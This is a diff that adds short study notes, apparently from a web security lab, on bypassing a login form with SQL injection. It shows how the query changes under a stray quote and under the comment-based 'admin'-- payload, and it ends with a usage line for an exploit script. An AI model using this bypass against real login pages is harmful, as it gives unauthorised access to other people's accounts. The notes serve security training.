@@ -1,0 +1,17 @@
+SQL injection - Login functionality
+
+End goal: perform SQL attack and log in as the administrator user
+
+Analysis:
+----------
+
+SELECT firstname FROM users WHERE username='admin' AND password = 'admin'
+
+SELECT firstname FROM users WHERE username=''' AND password = 'admin'
+
+SELECT firstname FROM users WHERE username='admin'--' AND password = 'admin'
+
+SELECT firstname FROM users WHERE username='admin'
+
+
+script.py <url> <payload>
